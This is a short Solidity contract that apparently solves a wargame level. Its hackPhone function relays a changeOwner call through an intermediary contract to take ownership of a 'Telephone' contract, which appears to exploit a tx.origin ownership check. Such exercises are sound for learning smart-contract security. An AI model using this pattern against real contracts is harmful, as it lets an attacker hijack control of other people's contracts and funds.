// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract pickUp {

    ITelephone telephone;
    address public owner;

    constructor(address _telephone) {
        telephone = ITelephone(_telephone);
        owner = msg.sender;
    }

    function hackPhone() public {
        telephone.changeOwner(owner);
    }
}